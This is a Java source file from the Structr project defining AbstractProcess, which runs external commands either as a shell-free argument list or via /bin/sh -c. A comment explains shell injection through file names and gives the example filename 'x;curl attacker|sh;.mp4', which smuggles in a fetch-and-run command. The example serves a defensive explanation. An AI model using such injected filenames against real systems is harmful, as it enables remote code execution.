/*
 * Copyright (C) 2010-2026 Structr GmbH
 *
 * This file is part of Structr <http://structr.org>.
 *
 * Structr is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 *
 * Structr is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Structr.  If not, see <http://www.gnu.org/licenses/>.
 */
package org.structr.util;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.structr.api.config.Settings;
import org.structr.common.SecurityContext;

import java.util.List;
import java.io.IOException;
import java.util.concurrent.Callable;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 *
 *
 */
public abstract class AbstractProcess<T> implements Callable<T> {

	private static final Logger logger = LoggerFactory.getLogger(AbstractProcess.class.getName());

	private final AtomicBoolean running       = new AtomicBoolean(true);
	protected SecurityContext securityContext = null;
	private StreamReader stdOut               = null;
	private StreamReader stdErr               = null;
	private int exitCode                      = -1;

	private Settings.SCRIPT_PROCESS_LOG_STYLE logBehaviour = Settings.SCRIPT_PROCESS_LOG_STYLE.get(Settings.LogScriptProcessCommandLine.getValue());

	public AbstractProcess(final SecurityContext securityContext) {

		this.securityContext = securityContext;
	}

	public abstract StringBuilder getCommandLine();
	public abstract T processExited(final int exitCode);
	public abstract void preprocess();

	/**
	 * What to write to the log for this process. Falls back to the argument list where a subclass
	 * provides one, because getCommandLine() is null for those and this is called on every run and again
	 * on a non-zero exit code.
	 */
	public StringBuilder getLogLine() {

		final StringBuilder commandLine = getCommandLine();
		if (commandLine != null) {

			return commandLine;
		}

		final List<String> arguments = getCommandArguments();
		if (arguments != null) {

			return new StringBuilder(String.join(" ", arguments));
		}

		return new StringBuilder();
	}

	private boolean shouldLogCommandWhenExecuting() {

		return (getLogBehaviour() != Settings.SCRIPT_PROCESS_LOG_STYLE.NOTHING);
	}

	/**
	 * The command as a list of arguments, executed without a shell, or null to fall back to
	 * {@link #getCommandLine()}.
	 *
	 * <p>Ticket 1587: getCommandLine() is handed to /bin/sh -c, so every character of it is shell
	 * syntax. Where any part of the command comes from data - and for the media processes that part is a
	 * file path, which in a mounted folder carries the file NAME - a name like
	 * "x;curl attacker|sh;.mp4" is a command, not an argument. Quoting at each call site is the kind of
	 * defence that holds until someone adds the next command; not having a shell is the kind that does
	 * not need maintaining.
	 *
	 * <p>Deliberately an opt-in second path rather than a replacement: exec() and exec_binary() run a
	 * command line an administrator configured, and pipes and redirections are the point there.
	 */
	public List<String> getCommandArguments() {

		return null;
	}

	@Override
	public T call() {

		try {

			preprocess();

			final List<String> arguments    = getCommandArguments();
			final StringBuilder commandLine = arguments == null ? getCommandLine() : null;

			if (arguments != null || commandLine != null) {

				final String[] args = arguments != null
					? arguments.toArray(new String[0])
					: new String[] { "/bin/sh", "-c", commandLine.toString() };

				if (shouldLogCommandWhenExecuting()) {

					logger.info("Executing {}", getLogLine().toString());
				}

				Process proc = Runtime.getRuntime().exec(args);

				// consume streams
				stdOut = new StreamReader(proc.getInputStream(), running);
				stdErr = new StreamReader(proc.getErrorStream(), running);

				stdOut.start();
				stdErr.start();

				setExitCode(proc.waitFor());
			}

		} catch (IOException | InterruptedException ex) {

			logger.warn("", ex);
		}

		running.set(false);

		// debugging output
		if (exitCode() != 0) {

			logger.warn("Process {} exited with exit code {}, error stream:\n{}\n", getLogLine().toString(), exitCode(), stdErr.getBuffer());
		}

		return processExited(exitCode);
	}

	protected String outputStream() {

		return stdOut.getBuffer();
	}

	protected String errorStream() {

		return stdErr.getBuffer();
	}

	private int exitCode() {

		return exitCode;
	}

	private void setExitCode(final int exitCode) {

		this.exitCode = exitCode;
	}

	public void setLogBehaviour(final int logBehaviour) {

		this.logBehaviour = Settings.SCRIPT_PROCESS_LOG_STYLE.get(logBehaviour);
	}

	public Settings.SCRIPT_PROCESS_LOG_STYLE getLogBehaviour() {

		return this.logBehaviour;
	}
}
